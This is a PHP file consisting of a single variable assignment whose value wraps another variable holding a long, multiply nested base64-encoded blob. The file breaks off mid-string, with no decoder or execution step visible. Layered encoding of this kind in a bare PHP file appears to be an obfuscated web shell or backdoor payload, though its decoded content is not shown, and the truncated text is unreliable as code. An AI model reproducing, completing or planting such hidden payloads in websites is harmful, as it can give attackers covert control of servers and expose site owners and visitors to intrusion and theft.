<?php $bptV = ' $meme = 'ICRzRlRDID0gJ0lDUnJjV2RxSUQwZ0owbERVa3BVTW5SMlNVUXdaMG93YkVSVmF6bHJWbFUxVTFOVlVYZGFNRzkzWWtWU1VtSlVSbkpXYm5CWFkxWndSbHBJVG10aVZYQjNWVmMxVjJFeFdYcGhSRXBoVWxkb1RGbFZaRXRrVmxKMFlVWndUbUpZWkROV01uaHFaREZ2ZDJSRlVsWmlWMmh4V1d4a1QyUXhUbFpoU0hCaFRXczFNRlp0Y0VOaE1XUkdZMFJHVkZaVk5YVlpha0ozVTBaS2RXSkhSbXhXVlZVeFZsVmFUMUZ0UmxaTlZWSlVWMFZLVFZaclVtOWpSbEpXVkd0d1QyRXpVa1ZWYkdNMVV6RkpkMWRxVmxoaWJYaDVXVEJhUTA1V1RuSlBWbVJYVjBkb1QxVXhaSGRrYlVaV1kwUldWRmRHV2t4VmFrSmhUbFprZFdGNlFtaFdXRUV4VlRGU2ExTnNUa1ZSYlRWVVZsVTFRMXBIZERCalJrWnlZVWRHVjJWc1ducFhWRWw0VWpKRmVWTnFWbEppV0VKd1ZGZHdVMkpzWkhGVGJHUnJWbTVDV2xVeU1XOVpWa28yWWtSV1ZGWldXa2haVkVwT1pXeGFkVlZyY0ZKTmJXaDRWWHBHVGsxR2IzZGlSVnBZWVd0YWNGbHNWVEZrTURVMldUTktVRll3Y0hoWmFrcHJWbFpLTm1KSE9WaGhNbWhVV2xaYWMxZEZOVmxqUm5CWFRVUldNMWRyVm10V01sSkdZa1ZhVm1KWWFIRlVWM014VGxac1YyRkZUbWhpVlZwWlZERm9WMVZIUmxaVGEwNVlWa1Z3VUZsclpFNWxWa3BZV2tkR1YwMHlVblZXYkdONFZqSktkRkpzYkZWaGEwcHhXV3hTYjJKc2JGZFpla1pvVFd0YVdWWkhNVzlaVmtvMllVYzFXR0V5VWxkWGFrcExVMFpLV0ZwSGRGTk5SbkIzVjFkMGExSnNiM2hXYTJoVFltMTRZVlp1Y0Vkak1YQkdZVVYwYTJKVk5ESlpha3ByVXpGSmVXVklaRnBpVkZaVVZGVmtUMlJHU25WV2JYQk9ZbGhrTTFZeWVHdFVNbEp6WTBWb2FWSjZWbkJhVmxaTFVsWmtWMWt6YUd0TmEyOHhWVmMxYTFkc1pFWmlNMlJZWWtVMVJGbFVSbmRXUmtaMVZHeHdWazFGY0RaWFYzUnJVakF4YzJOR1VsSmliVkp4V1d4a05FMUdaRmRoUlhScVVtMTRWVlZYZUU5WlZtUkhVMnBLV2sxcVFYaGFSM00xWTBaR2MxWnNXbWxTYkhCSVZURldVbVF4YjNoV2JsSlhZbFJXYjFZd1ZUQmtNV3Q1VFVSU1lVMXJNVFZVTVdoUFlVWlpkMDVZWkdGU1YxSklXVlJLUzA1V1JuSmFSa3BYVjBkb1ZsWlhlRTlSYXpsV1lrVmFWMkp0ZUhGWmJGSnpUbFpPVmxwR1RtbFNWM2hKVlRJeGIyRnJNWE5XYlRWWVlUSlNWMWRxUm5kVFJrcHhVVzFzVGsxRVJuVlhWelZ6VVRKRmVHTkdVbEppV0VKd1ZGZHdWMk14WkZWVGF6bHFVa2ROZWxNemNITmhWMFpXVTJ0T1lWSnRhRlJhUnpGUFkxZEplVnBHU2xkV2EzQldWbTE0Vm1ReGIzaFRibEpYWWxoQ2IxVnFRbFpOYkU1V1ZXdGFiR0V6YUZkV1Z6RTBWMnN4YzFkcVFsaFdla1pZV2xaV05GWldUbGxhUlRWVFVtdGFkVlpyV21wT1YwVjVVbXhvV0dKclNtRlVWM1JoWTFac1dGWllTazFOTVhCWlZHdGthMkpXUlhkVGEyaFlZa2RTVUZscVJuTldSa1p4WVVWd1UxWldiRFJYYTFacVRsZFdWbUpGVW1sTk1YQkxWVlJDUzJSR2NFZFpla1pvWWxaS1NWbHJhR0ZoVjBaV1UyNXdXbUZyY0VoWlZFcFBaRVphZEdOSGJFNU5TRUo1VjJ0V2IxTXlSa2hUYmxaVllsZG9ZVlJYTVROa01XUnpXVE5rYVUxSGVFVldWelZEWVVaYU5sWllaR0ZTVjJoTVdWVmtTMlJXVW5WUmJYUlRUVlp3ZUZkWGNFdFZNazVIWWpOc1VGTkZOVXhWYm5CV1pVWldWVk5VVm10V01IQjNWVlpvUTFOc1RrbFViVFZVVmxkU1ZGbHJXbmRrUjBwSlZtMUdWazF0VW5kV01uaGFUbGRHZEZOWWJFOVhSbHBvVm1wQk1HUXhiRmRaZWxaclZsZDRkMXBFVGxOVWJGVjVZM3BPVkZaWFVsUlphMXAzWkVkS1NWWnRSbFpOYlZKM1ZqSjRXazVYUlhoaVNFSlVWMFUxVGxaclZuTmtNVkY2WWtWT2FFMVlRbGxXTWpWRFlWZEtWMVp1V2xSV2VrWllWMjE0ZDFkRk1WbGFSM1JVVWpOU2QxWkZWazVrTWxaeVpFWldhazF0VW1oVmFrWmhaRVpzVjFsNlJtbFNXRkpGVlRJeGQxbFdaRVpqUkVwVVZqSjNlbHBFUWpCV1YwMTVXa1Z3VTAxdWFEQlZNVlpQWW0xRmVWTnVWbGRoTVVwd1ZGZHdWMDFXVFhoVWEwNVBUVWQ0UlZaWE5YZFhiVXBHVGxSU1dtRXdOVU5VTVZaelVrWk9jMVZzVGxkWFIyaElWbFpTUjFWc2IzZGtTRUpTWVRKU1YxbFljSE5VTVU1V1lVWk9iRlp0ZUZsVWJHaDNWMnhaZDA1WVpHRlNWMUpZV2tWV2MxSXhjRVppUms1WFlUTkNTRlV4Vm05Vk1sWlhZa1pvVDFkSVFtOVdNRnBMWXpGa1ZWTlVWbWhOYTFwWlYydG9ZVk5zU2tWUmJUVlVWbFUxUzFwR1ZuTmpSbXQ1WWtVeGFGWnJjRE5YVmxwcVRWVXhTRlZyYkZSaVYyaHdXVzF6TVdReGNFWmFSbVJvWWxWc05WWlhOVU5aVlRGeFlVUkdWRll5ZUhGWlZsVTFUbFpHV0ZwRmRGTmxiRlkwVm14amVGWXlWblJWYkdoc1VrVktTMVZyVWtOaWJHdDNXa2QwWVdKSVFscFpWV1EwVjIxV1dGcElTbHBpVkZaWVZXdGtTbVZWTlZsV2F6RlNUVlZ2TWxZeFpEUlVNbFpJVTJ0U2FHVnRVa3RWVkVKS1pVWnNkRTVWT1dsU01VcEZWMnBLTUdGck1YSmpSbFphVFZkUmVsa3dWVFZPVmtaMVVXMUdhRlpWV2pKVk1uUnFUVlV4VjFadVVsZGlia0p5Vm1wT2JtUXhUWGhVYTA1UFRVZDRSVlpYTlZkaE1WcFdUbGM1V21KVVZsUldWRXBLWld4cmVWcEdSbFpOUlc5NlZqSndSazVYVWxoVmJHaE9WMGQ0Y0ZSVVNsTk9iRTEzVkd4T2ExWXhTbGhWTWpFMFlXc3dlRmR1Y0dGU1ZUVjVWR3BDYzFKR1JuVlJiVVpvVmxWYU1sVXlkR3BOVlRGWFVsaHNVMkpzV25KVmJYUjNUV3h3U1dKRlNreE5SM2hKVmtjeE5HRnRTbFZoU0dSVVZsZG9ObGRxUW5OU1JsWjFWbTEwVjFaVVZuWlhWekF4VlRGSmVWSnNhRmRpYXpWb1ZUQlZlR0pzVmtkVWEwNXJUVmM1TkZReGFGZGhNVm8yVW01U1dsWnRVbGhaZWtaM1UxWlNXRTlWZEZObGJGWTBWbXhqZUZZeVZuUlZiR2hzVWtWS1RWWnJhRTlpYkU1eVlVVTVhRlpzV2pCVU1WSlBVMnhLUlZGdE5WcE5SMUp5VjIxNGQyUkdXbkZSYkhCT1lsZG9kRmRVU1hkT1ZUQjNZa1ZTWVUxdVVuQlpiWGhoVmtaa2MyRkZPVTVXTUhCS1ZsWm9UMWRyTVhOWGFsWmFZbTE0ZVZScVFuTlNSbFoxWTBad2FFMHlhRE5YV0hCUFZUSkdSbUpGVms1U01sSmhWakJXZDA1V1pGZGhTRXBwVFVkNFJWVXljRU5oYlVwV1YycEdXbVZyY0hwVVZWcDNWMFpTZFZkdFJsTk5ibWd4VjFjMWMxTnJPVmRSYmtKV1ltNUNZVmxyVm5kTmJIQkZVbTV3YTAxWGFGVmFSRXByVTIxS2MxTnVaRnBOUjA0MFdrY3hVMlJHVW5WWGJVWlRUVzVvTVZkWE5YTlRhemxYVVc1Q1ZtSnVRbUZaYTFaM1RXeHdSVkp1Y0d4U2JXaFZXa1JLYTFOdFNsaGtNMlJZWWtkT05GbFhNVXBsVmxaMVVXMUdUbUZ0YUhkV1ZWcFNUVWRGZVZSWWJGUmlSVFZ3VkZSS1UyRldVbGhrTTJScVRVZDRSVlV5Y0VOaGJVcFdWMnBHV21WcmNIcFVWVnAzVjBaa2RHVkdjRTVpVjJoMlZURmtkbVF3YzNkalJXeFZZbGQ0VjFsc1VuSmxiRmw2WTBVNVlWSllhRVZWVm1SellURk9SbU5IT1ZwaVZGWlFXVEJrVTFOR1duUmpSbkJYWld4V00xZFdXbXRWYlVaWFVXeFdUMUl6VW5GVVYzUjNWa1pzY1ZSdGRGcGhlbFpJVkZWb1QxTnNSWGRpTTJSYVRXcEdTRnBHWkU1bFYwcEZVVzFHV0ZKcmIzbFhhMVpyVWpKTmQySklSazVSTTFKTVZUQlZNV05HV2xoTlJGWk9UVmRSTWxadE1WTlVWa1YzVW01Q1lWSnRhRkJVVmxwelYwWlNkVmR0UmxOTmJsSjNWbFZhVWsxSFJYbFVXR3hVWWtVMWNGUlVTbE5oVmxKMFpETmthazFIZUVWVk1qRnpZVlV4YzFOdVRsaGhhM0JJV1ZjeFNtVldWblZSYlVaT1lXMW9kMVpWV2xKTlIwVjVWRmhzVkdKRk5YQlVWRXBUWVZaU2NWSllaR3BOUjNoRlZUSTFhMWxXV1hoVGJtUllZVEpOTVZsWE1VcGxWbFoxVVcxR1RtRnRhSGRXVlZwU1RVZEZlVlJZYkZSaVJUVndWRlJLVTJGV1VYZFhXR1JxVFVkNFJWVXlOVU5oTVVsNFYycGFZVkpYVWtoWlZ6RktaVlpXZFZGdFJrNWhiV2gzVmxWYVVrMUhSWGxVV0d4VVlrVTFjRlJVU2xOaFZsRjRWMWhrWVUxSVVsWlpla3ByWVcxS1YxZFlaR0ZTYldoTVdrWldjMUpHVm5WalJuQm9UVEpvTTFkWWNFOVZNa1pHVDFSV1VtRnRlRXRWYWtaaFpXeHNObE5zV21GTmJGa3hWVlprYTJGdFNsZFhXR1JoVW0xb1RGcEdWbk5TUmtaMFpVWnNUbUpHYjNkWFZFSnZWVEExVms5VVZsSldNbEowVmxSQ1NrNVdUbFphUm1ScVRXc3hOVlpzWkd0aVIxWldVMnBXV0dKSGFGUlVWbVJQWkVVMVNGcEZjRk5OVm5CMFZqSjBhMU5yTkhkaVJXeE9VakpTZEZaVVFrdGpNV3h5WVVVNWFWSlhlRXBaZWtwcllXMUtWMWRZWkdGU2JXaE1Xa1pXYzFKR1JuUmxSbXhPWVhwVmVWZFhNSGROVjBwSFlUTndWbUpyU25CVVYzQlNUVEZPVmxvelpHRk5iSEJWVlZaa2ExUlhWbGhQVnpWV1lXdHdXRnBHV25kWFZrNTBZVWRHVTJWdGFIVldNVkpLVGxkU1ZtSkZhR0ZTTTJod1dXeGFZVTVXWkZkYVJrNXJZbFUxZDFWWGRFdFpWazVHVGtob1dtSkZOVU5aYWtaelRsZEZlbFpyY0ZKTlJYQkpWMnRhYWsxWFJuUlNiWGhNWlZScmVWWnVjRkpOYkU1V1drZEdUbFl3Y0VsYVZXaDNWMnN4Y2xkcVJtRlNWMmhNV1ZWa1MyUldVblJoUm5CT1lsaGtNMVl5ZUdwa01XOTRVMnRvVjJKdVFtRlVWRUozWkRGcmQxcEZPV3BTTUd3MVZHdFNZVk5zU2xaWGJrWllWa1Z3V0ZwWGVITldSa1p4VVcxc1RtSkZiM2xYVkU1elVUSk5lVk5ZY0ZWV01sSlhXV3hhWVdSV2JGZGhSVGxPVWpBMU1GUXhhSGRUYkVWM1UyNUtXR0pGTlVSWmVrWnpWa1pHY1ZGc2NGZE5TRUkyVmpGYVQxRXhWbGRpUm14VVlsZG9jRlpxUmxwa01XdDVUVVJXYkdGNmJIZFZWM2hQV1Zaa1IxTnFTbHBOYWtGNFdrZHpOV05HUm5OV2JGcHBVbXh3U0ZVeFZsSmtNVzk0Vkd4b1ZsWXlVbWhWYWtaWFlteHdSbUZGZEdoU01IQXhWa2N4YjFkck1YSk9XR1JhWVd0cmQxZHFSa3RqYkVweVRWWmFUbEpzV25WV1ZWcFBVVEZLZEZSdVZsUmliSEJ4V1ZaV1MyTnNaSE5VYTA1b1ZtMTRXbFpITVRSVGJFbDRVMjVPVkZaWFVsUlpWV1JUVTBVNVdXTkZjRk5sYldoMVZqSjBhMVpzYjNoaE0yeFFWMFphYUZacVFURmpWbXhZVmxoS1RVMHhjRmxVYTJSclZXeGtSMWRZWkZwaGF6VkxWRzEwYzFKc1NuSldiRnBPVm14d1VGVXhWbGRaVjBwSFlUTnNhRkl5YUZGWlZsWkhUa1pTV1dFemFGTldia0paVmtjeE5HRldXWGRqU0U1YVRXMTBNMXBXVlhoU1ZrWlZVV3R3VTFaRldYbFdNblJyWXpKS1dGSnNhRlZpVjJoaFZGY3dNVTF0VW5GWk0yaHJWbGQ0U2xwRVNtdFZNa3BYVjI1R1dsWlhVa2RYYWtwaFVrWkdjbE50ZEZoU2EyOTVWMVJLYzFGdFRsWmxSRlpTVmpKU2FGbHRlR0ZOVm1SVlZHeE9hbEl3YkRWVWEyUnJXVmRLYzFkdWNGcGhNbWhRV1ZkNGMxZEZOVlZSYlhCcFZsWnZlRmRZY0V0U01rWjBVbXhzVm1KWWFIQldWRXByWTJ4c2RFNVdaRk5TTUd3MVZHeG9WMVJHVlhkVFZFNVVWbFUxUkZsVVJuZFhSbVIxVVcxc2FWWnNXakpWTVdONFZqRndjMkV6YkZCWFJscHdXV3hhWVdOV2NFWmFTRTVyWWxWd2QxVXhhRTlVVmxwR1ZtNWtWVTB5ZUVSWlZFWjNWMFprZFZGdGJHbFdiRm95VlRGamVGWXhjSE5qUldoVVZqSjRUbFZZY0VOT1ZrMTRWVzV3WVUxWVFrbFdiVEI0WVVaYU5sWnVUbFJOUlRWTVdXdGFibVZXV25WVmJYQlVVbXRyZUZVeFpITk5NbEpHVFZSV2FHVnRVa3RWYWtaTFl6RmtkRTFZVG10V2JrSlZWMnBLYzFkck1YTlhhbFphWW0xNFMxbDZRWGhTUjBZMldrVndVazFGY0ROV01qRnpVVzFKZDJORmFFOVdSVnBUVkZkd2MwMVdiSFJpU0VwaFRXeFpNVlZXWkRCaGF6RnlZMFpXV2sxWFVYcFhha1pEVmtaR1dHSkdXazVTYkhCUFZsZDRWMVF4V2xaaVJWSnBUVzFTVkZsclZuZFZWbHBIVkd0T1RsSXdOVEJWYlRWWFlXc3hjbGR1UmxwV2JXaFVXV3RrUzFaR1RsVmFSWEJTVFVWYWVWZFhNREZXTVZWNFkwWnNWV0ZyV25CVk1GcEhZbXhXUjFSclRtdE5WemswVkRGa05HSkdTWGhYYmtaVVRVVTFWRnBHWkZOV2JGSjFWMjFzYVZaR1NqWlZNblJ2VkRKR1YxWlljRk5pYXpWTlZtdG9UMkpzVGxaYVNFNXBWbGQ0UlZkcVNqQmhWMHB6VjJ4U1dHSkhhRkJVVm1STFUxWldXVkZyY0ZSVFJUVjFWVEowYWsxVk1WZFNXR3hUWW14YWNsVnRkSGROYkhCSllrVktVRlpYZUVwVlZ6QXhWMVV4Y1ZaWWFGcGlSMmhNV2tjeFVtVnNVbGhQVlhSVFpXeFdORlpzWTNoV01sWjBWV3hvYkZKRlNrMVdhMmhQWW14T1ZtRkdaR3RXTURFMVZtMXdRMVJHUlhoVGFscFlWak5vVUZwVlpFdFNSMFkyV2tWd1UwMXVhREJWTVZaUFltMUZlVk51VmxkaE1VcGhWbTV3Vm1ReFdsaE5SRlpPVFVkNFJsUnJaR3RYYXpGelYycFdXbUp0ZUhsWGFrcFhUbFpHV0ZwSGNHbFdiR3d6VjJ0YWIxTXlVbFppUlZKV1lteGFjbFp0ZEhkak1XdzJWR3hrYWsxc1NrWlpla3ByWWxaVmQxTnVUbHBoTW1oUVdXdFdjMU5YVFhsYVJYQlVVbGhDZWxkclZtOVdNbFpZVTI1Q1VsWXlVbWhXYlhCell6RnNjMkZGVGs1U01WcFdXWHBLYTFOc1RrVlJiVFZoWWtVMVJGbHJaRXRUVmxKMFpVVndWRk5GTlhWWFZFbDRWakF4U0ZWc2JGUmliRnBMVlZSQ1MyTXhaRVZUYkU1b1ZsUnJNVlZYY0hOVGJFNUZVVzAxV0dKSFVUQmFWM2gzVmtaR2NWcEZjRlJTV0VKNlYydFdiMVl5VmxoVGJrSlNWakpTYUZadGNITmpWbXh4VTFSR2ExWnVRbGxXUjNCRFlVWmFObUpFUmxWTk1uaEVWREZXYzFOVk1VaGFSWEJTWlcxb05GVXhWbGRoTWtwSVUyNVNWMkp0ZUdGV2FrWkxUV3hPVmxwRk9XdGlWWEIzVlZjd01WbFdXalpXYms1YVRXcEdTRmxVU2twbGJFNVlXa1pLVjAxVmJ6SlhhMXBxWkRGdmQyUkZhRlZYUlVwT1dWWldSMkpzVm5ST1ZtUnJWbTEwTlZsdE5XRk5helUyVW1wR1ZVMXRlRVJXYTJSSFYwVTFWVkZzY0ZoU01tZ3pWMWh3VDFVeVZsZGlSbWhQVjBoQ1lWWnFRVEZrTVhCR1drWmthMUpYZUVkV1Z6RTBZV3N4Y2s1VVZscFdiV2hFV1ZjeFIxZEZPVmxXYkVKb1ZsVndXVll5ZUc5VE1rNUhZMGhTYVZJelFtRldWRUpMVG14c1YxbDZSazVTYlhoYVdWVm9RMkZ0VmxaVGJrcFlZa1UxUkZsNlJuTldSa1owWTBkc1RtRnNXVEpYYTFwclRrVXhSMkpHVWxKaVdHaHdXVlpXUzJOc2JGZFpla1pvVWpCd1dWbHJaSGRXYXpGeVRsYzVXbUpYZUVSV1ZscHpWMVpPZEdGSGJGZE5WbXd6VjFSSmQwNVhWbkpQV0VKU1ZqTlNZVll3Vm5ka1ZrNVdWMjFHYUZJd2NFbFVNV2h6VTJ4SmVGTnVUbHBoTURWRVdWZDRjMWRGTVZsYVIyeHNWbFZhZVZZeFVrdFNNbEpJVkd0b1VGSXlVbFpaYkZKelRVWmtXRTVWZEdsU1YzaEpWbGN4TkdGV1JYZFRia1pZVm0xT05GcEVTa3RPVmtaWVpFZEdhVmRIYUhaV01uQlBWVEpXVjJKR2FFOVhTRUpoVm1wQk1XUXhjRVphUm1SclVsZDRSMVV5TVc5aFYwcFhVMjVPV2sxcVJrZFhha3BQVjFaYWRHVkZjRk5OVlhCNlZqSXdlR015VWxkalJsSlNZbTVDYjFaVVFrdE9iR1J6Vkd0T1RsWXhTa2xaYTJoUFlVWmtTVkZ0T1ZSV1ZscElWa1JHUzFKR1JuTlViVVpZVW10dmVWZFVTWGROVjFKeVQxaENVbUpHV2xkWmExcGhVakZPVmxWWVpHRk5WWEI1VlcxemVGWnJNVWRXYlRWV1VtczFSRlZYTVZOWFZsWjFWMjF3YUdKVWJIVldNVnB2VXpKT1IySkdiRlZpV0VKd1ZGUkJlR0pzVm5STlZtUm9ZbFZhU1ZWc1VtRlRiRXBHVm1wYVZWSnNXbFJaYTFweVpWWmFkVlZzY0dsV2JHOHhWa1ZhVTFOdFVYZE5WVlpXVmpKU1ZsWnVjSE5qYkd4WFdrZEdhbEp0ZERWVmJURjNZVVp3VkdNeldtdGlSMDEzVjJwS1lWSkdSbkphUjBaWFRVUldNbFl4V2s5Uk1EbEdZa1ZhVTJGclduSlZibkJ6VGxaT1ZsUnVXbXRoTW5oRlZWY3dlR0V4V2paV2JrWmhVbGRTZWxwSE1VdGpSa1oxWTBkb1YyVnNWak5XTVZwdllqSk9TRlJZY0ZaaWJYaGhWbTV3VjA1c1pGZGFSVGxxVWpGS1NWWnROVk5UYkVWNVdraEtXRlp0YUV4WmJYUTBVa1pHV0dSR2NFNWhNVzkzVjFSQ2FrNUhUWGRpUlZKWVZqTlNhRmxzYUc5aU1XUnhWR3hPYkZadGVGbFViR2gzVjJ4WmQwNVlaR0ZTVjFKWVdrVldNRlpHUm5GYVJYQlNUVVZ3TTFZeU1YTlJiVWwzWTBWb1dHSnJOV0ZXYWtwU1pERnJlVTFWWkd0V01ERTFWVzB4ZDJGR1pFZFRiazVhWWtVMWVWZHFTbGRPVmtaWVpFWndXRkpzYTNkVk1WWlNaREZ2ZDJKSVNsTmhlbXhVVlZSQ2NrMHhUbFphTTJSaFRXdGFXVll4Wkd0VVJrVjRVMjA1V2sxcVJuRlVNVnBEVmtaT1dHSkZlRlpOUld0NlZURldiMU15U2toVmEyeFhZbTE0Y0ZsV1ZrZGpSazVZWTBod1lVMXNjRlZWVnpFMFlWWk9SazVZVGxSV1YyZzJWMnBDZDFOR1pIVlViSEJYVFd4R00xZFVTWGhTTWxKWVZGaHNVMkpZUW05V01GcExZekZzYzFSclNsQldWM2hHVld4U2ExTnNUa1pqU0U1aFVsZG9XRnBXWkV0alJrWllaRVp3V0ZKc2EzZFdSV1J6VTJ4dmVWVnNiRkppYlZKb1ZqQldjMlJzVGxoaGVrSm9UVmQwTlZWdE5WTmhiRW8yWVVSR1ZGWXllSGxYYWtwTFUwZEtTVk50UmxaTlJWb3hWVEo0VDFOdFVsaFVXSEJXWW0xNGNsVnVjSEpsUm10M1lVVk9hVkl3TlhkWGFrb3dWMnhrUm1OSVZsUk5WVEIzV1ZaV2QxWkdhM2xpUmtKc1ZsVnJNVlV4Vm01a01XOTNZa1ZTVUZORldrdFZiR1JUWXpGc2RFMVdaR3hXYlhoWlZsYzFZVk5zU1hkT1ZFcGFZbGQ0UkZsdGVIZFhSVFZZWlVkd2FWWldjSGxYVjNCUFUyeHZlRkpzYUZaaWJrSnlWbTV3UTJKc1RYZGFSVFZxVWxob2QxVldaR3RWTWtwelYycEdXRlpGY0RGYVJ6VmFUVEF4V1Zac1FtaFdWWEJIVjFaYWFrMVhSa2hUYkdocFVqTkNWMVJYY3pGaU1XeDBUbFpPYkZadGVGbFViR2gzVjJ4WmQwNVlaR0ZTVjFKWVdrVldjMUpzVm5SbFIzQk9ZWHBWTVZkV1dtOVJNa1owVW14b1VGZEdXbEZaVmxaTFVURmtWVk5yT1dsU01ERTFWV3hrYTFsV1dYcGFSelZhVFdwR1dGbHRNVWRYVmxKeFVXMXdhVlpIYUhWWFZFWnZWakpLUm1KRmFHaFNNbWhoVkZkNFYySnNiSE5hUldST1VtMTBOVmRxU210WGF6RnhZa1JHVkZaWFVUQlpWVlp6VTBaYWRWWnRkRlJTV0VKMlZqSjBhMUpzYjNoV2EyaFRZbTE0WVZadWNFZGpNWEJHWVVWMGEySlZOREpaYWtwclV6RkplV1ZJWkZwaVZGWlVWRlZrVDJSR1NuVldiWEJPWWxoa00xWXllR3RVTWxKelkwVm9hVko2Vm5CYVZsWkxVbFprVjFremFHdE5hMjh4VlZjMWExZHNaRVppTTJSWVlrVTFSRmxVUm5kV1JrWjFWR3h3VmsxRmNEWlhWM1JyVWpBeGMyTkdVbEppYlZKeFdXeGtORTFHWkZkaFJYUnFVbTE0VlZWWGVFOVpWbVJIVTJwS1drMXFRWGhhUjNNMVkwWkdjMVpzV21sU2JIQklWVEZXVW1ReGIzaFViR2hXVjBaYVMxVnFSa3RqTVU1V1lVWk9iRlp0ZUZsVWJHaDNWMnhaZDA1WVJscFdiVTB4V2taV05HTkdSbkphUmtwWFYwZG9WbFpYZUU5UmF6bFdZa1ZhVjJKdGVIRlpiRkp6VGxaT1ZscEdUbWxTVjNoSlZUSXhiMkZyTVhOV2JUVllZVEpTVjFkcVJuZFRSa3B4VVcxc1RrMUVSblZYVnpWelVUSkZlR05HVWxKaVdFSndWRmR3VjJNeFpGVlRhemxxVWtkTmVsTXpjSE5oVjBaV1UydE9ZVkp0YUZSYVJ6RlBZMWRKZVZwR2NGaFNXRUl6VmpGYWIxUXlSblJUV0hCVlZqSlNWRmxzV21GalZteFdXa1ZhVDJFeWVFWlZiR2gzVkZaYVYxTnVUbGhXUlhCWVdrVmFjMlJHV25WaVJURlhVbGQzZWxaR1ZsTlZiRzk0Vld4b1VGWXpVbTlXYWtaM1pERmtWVk5yWkdoaVZWcHpVek5yTlUxc1dqWlZiVFZoWVRBMVJGVnFSbmRYUmxKMFQxWndWazFGYXpCVk1WWlhVakF4V0ZWcmFGQlhSM2hMVlZSSk5VMXNUbFpVYTA1cFZqRktXVlJzWkhkaE1VbDVaVVJLV21KWGVFUlpWRXBIVjBVMVdHRkhiRmROYm1oNFYxaHdTMVF5UmtoVGJsWldZbTE0WVZadWNGZE9iR1JYV2tVNWFsSXhTa2xXYlRWVFUyeEZlVnBITlZSaE1sSjZXbFphY21WR1RuUmxSbkJPWVcxM01WWXlkRTlOTWtWNVUyNVdWMkV4U25CVVYzQlhUVlpPVmxSdVNtRk5iRmt4VlZjeE1GbFdXWGhqU0dSYVlsUkdWMWxxUW5Oa1JscDBWMnh3VG1GdGQzaFhWekI0VmpKR2RGVnJhR2xUUm5Cd1dWWldjMlZzVWtkVmExcHFVbFJyTVZWWE1UQlpWbGw0WTBoa1dtSlVSbGRaYWtKelpFWmFkRmR0UmxOTlIzaDNWa1ZXVG1ReVZsWmtSbFpxVFcxU2FGVnFSbUZrUm14WFdYcEdhVkpZVWtWVk1qRTBWMVV4YzFkcVFscE5SMmhVVkd4V2MyTkhVWHBWYXpWc1ZqTk5lbFV4Vm10Vk1rcEhZMGhTYVZOR1dtaFdWRXByWTBaa1ZWTnNaR3hXTUc4eFZURm9UMVJzUlhsamVrNVVWbFUxVkZsc1pFdFRSa3AwVGxkMFZGSllRblpYVnpBeFZESkdSMkV6YkdsU1JVcG9WbTV3UTJKc1ZrZFVhMDVvWWtoQ1dsVXlOV0ZWUjFaV1VtMDFXbFp0VW1GWGFrSXdVa1pXZFZadGRGZFdWRlY1VjFjd2QwMUhUa1ppUld4cVRXMVNTMVZVUmt0T2JHUllaVVU1YkZJd2NFVlZWbEp6VTJ4RmQyTkdWbFppUmxrd1ZXMTRSbVZHVmxoYVJYaG9WbFZ3U1Zac1pIcE9WbEp5WWtWc1ZtSnRlR0ZXYm5CWFRteGtWMXBGT1dwU01VcEpWbTAxVTFOc1NuUlZhM0JXWWtad1RGVnRkSE5qUlRWSVdrZHdUbUpZWjNoWGExWnJVakExU0ZKc2JGVmhhMHB4V1d4V1lVMVdiRFpUYTJSb1lsVmFXbFpYTVRSaFZsVjVXa2hLV2xadGFFeFpWM2hYWkVaYWRHTkhiRTVOU0VKNVZtNXdUMVV5VmxkaVJtaFBWMGhDYjFZd1drdGpNV1JWVTFSV2FFMXJXbGxYYTJoaFYxWlZlbHBJUW1GU1YyaE1XVlZrUzJSV1VuVlJiWFJUVFZad2VGZFhjRXRWTWs1SFlqTnNVRkl5ZUU1VlZFWkxaRVpzY2xwRlpHbGlWa3BLVlRJeGIyRlhTbkpPVnpsWVZrVndlbFJWV25kWFJURkpVV3N4YUZaVmJ6SlhWbHBxVFZVeFIySkdiR2hUUlVweFZGUkdTMDVXWkZkWmVrWnNZa2Q0V1ZaSE5VTmhNVWw0VjJwQ1ZFMUZOVlJaTUdSUFpFWlNjMVJ0UmxkTlJGVjVWMVJKZUZVeGJIUlZhMmhwVTBkU2NGWnVjSEpsVm1SVlUxUldhRTFyV2xsWGEyaGhWMVpWZWxwSVFtRlNWMUo2V2tSS1MxZEZPVlZUYkhCT1lXMTRlVmRXV210aE1sSnlZa2hDYTAxdVVtaFpiR2h2WWpGa2NWUnNUbXhXYlhoWlZHeG9kMWRzV1hkT1dHUmhVbGRTV0ZwRlZqQldSVFZJV2tkd1RtSllaM2hYYTFaclVqQTFTRkpzYkZWaGEwcHhXV3hXWVUxV2JEWlRhMlJvWWxWYVdsWlhNVFJoVmxWNVdraEtXbFp0YUV4WlYzaFhaRVphZEdOSGJFNU5TRUo1Vm01d1MyTXdNVWRqUm1oT1ZqTkNjRlJYZUV0a01XUnhVMVJXWVZKWWFFVlZNalZEWVRGSmVGZHFRbGhXUldzeFdWUktSMWRHY0VsWGEzQm9WMGRTZVZZeU1IaE9SMFpIWWpOd1ZtSnRlR0ZXYm5CWFRteGtWMXBGT1dwU01VcEpWbTAxVTFSR1ZqWlZiVFZhWld0d2VscEdaRk5UUmtweFZXMW9XRkpVVWpOWFZFbDRVakpTV0ZSWWJGTmlXRUp2VmpCYVMyTXhiSE5VYlRWb1RXdGFXbFV5TVhkV2JVcFhWMjVHV21Gck5VeFpWRVpxWld4V2RXSkdjRmRsYkZreVYxWmFiMVV5U2tkalNGSlhZbGhDYjFWcVFtRmhNVkpHVkd0MFRsSXdOVEJWYlRWWFlXc3hkR1F6WkZoaVIxSm9XV3RhY21WWFJraGhSWEJvVjBkU2VWWXlNSGhPUjBaSFlqTndWbUp0ZUdGV2JuQlhUbXhrVjFwRk9XcFNNVXBKVm0wMVUxUkdWalpWYlRWYVpXdHdlbHBHWkZOVFJrcHhWVzFvV0ZKVVVqTlhWRWw0VWpKU1dGUlliRk5pV0VKdlZqQmFTMk14YkhOVWJUVm9UV3RhV2xVeU1YZFdiVXBYVjI1R1dtRnJOVXhaVkVacVpXeFdkV0pHY0ZkbGJGa3lWMVphYjFVeVNrZGhNMnhUWW14YWNsVnFTalJqYkdSSFZHcE9hRll4U2twVk1qRnZZVmRLY2s1WVpHRlNWMUpZV1ZkNGMxZEZOVlZSYldoWFRWVmFkMVpGVms5Vk1rcFlVMnRvVTJKVVZuSlZNRlozWWpGc2RFNVZPV2hTYlhRMVdXdFNRMWxXV2paUmJtUlZVako0UkZwWE1VZFhSVFZWVVd4d1dGSXlhRE5YV0hCUFZUSldWMkpHYUU5WFNFSmhWbXBCTVdReGNFWmFSbVJyVWxoU1JWWlhOVU5oYlVwV1RsWlNXR0pIVWxCYVJ6RlBa